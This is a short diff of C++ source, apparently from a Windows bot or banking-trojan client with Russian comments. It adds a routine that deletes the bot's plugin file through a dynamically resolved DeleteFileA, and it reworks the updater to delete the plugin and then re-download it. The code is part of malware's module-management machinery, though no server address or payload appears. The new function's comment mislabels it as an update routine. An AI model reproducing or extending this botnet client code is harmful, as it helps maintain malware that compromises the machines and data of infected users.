@@ -320,13 +320,32 @@ BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
 }
 
 
+
+
+//----------------------------------------------
+//  DeleteBotPlug
+//  Функция обновляет плагин
+//----------------------------------------------
+
+BOOL DoDeleteBotPlug(const string& FileName)
+{
+	return (BOOL)pDeleteFileA(FileName.t_str());
+}
+
+
+BOOL WINAPI DeleteBotPlug()
+{
+	string FileName = GetBotPlugFileName();
+	return DoDeleteBotPlug(FileName);
+}
+
 //----------------------------------------------
 //  UpdateBotPlug - Функция обновляет плагин
 //----------------------------------------------
 BOOL WINAPI UpdateBotPlug()
 {
 	string FileName = GetBotPlugFileName();
-	DeleteFileA(FileName.t_str());
+	DoDeleteBotPlug(FileName);
 	return DownloadBotPlug(FileName, NULL, NULL);
 }
 
